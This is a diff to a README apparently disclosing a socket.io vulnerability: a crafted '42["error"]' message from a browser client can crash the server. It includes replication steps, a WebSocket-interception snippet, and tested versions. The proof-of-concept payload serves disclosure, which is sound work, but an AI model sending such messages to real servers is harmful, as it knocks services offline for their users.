@@ -4,8 +4,10 @@ A carefully crafted message sent from a connected client can throw an error on t
 ## Replication
 - In the code below, the attack will commence as soon as soon as the [WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket) instance is intercepted
 - One can run this repository, open the url it would be hosted in a browser and paste the code in to execute the attack
-- You can wait for a probe from the server or initiate some interaction just to access the websocket to send the maliciously crafted text
-- This works to at least `3.1.2` and it works because of unfortunately handled events from [socket.io](https://github.com/socketio/socket.io)
+- You can wait for a probe from the server(this takes a little while) **or** initiate some interaction just to access the websocket to send the maliciously crafted text
+- This works up to `4.6.1` and it works because of unfortunately handled events from this library
+- Exact versions tested were: `3.1.2`, `4.3.2`, `4.6.2`(this one didn't crash), `4.6.0`, `4.7.5`(this one didn't crash), `4.6.1`
+
 ```js
 function listen(fn){ //this function from my answer in https://stackoverflow.com/a/70267397/10697213
   fn = fn || console.log;
@@ -40,5 +42,8 @@ listen( ({data,socket}) => {
   window.server=socket
   //2 lines above contain pointless logging
   server.send('42["error"]') //THIS IS THE CRITICAL LINE
+  //server.send('42["error","you can have any JSON serialisable data here(2nd entry in array) and it will show in the error context >:D"]')
 })
 ```
+
+![server crash example](example.png)
